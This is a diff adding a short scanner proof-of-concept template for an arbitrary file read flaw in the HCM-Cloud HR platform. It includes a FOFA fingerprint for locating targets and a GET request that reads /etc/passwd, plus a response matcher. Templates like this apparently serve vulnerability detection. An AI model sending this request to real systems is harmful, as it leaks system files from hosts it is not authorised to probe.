@@ -1,0 +1,15 @@
+id: poc-yaml-hcm-cloud-download-anyfile-read
+info:
+  name: HCM-Cloud云端专业人力资源平台 download 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: HCM-Cloud云端专业人力资源平台
+  fofa: icon_hash="-859381597"
+requests:
+- method: GET
+  path: /api/model_report/file/download?index=/&ext=/etc/passwd
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && contains(headers,"filename=") && !contains(body,"<")
+variables: {}
+transport: http
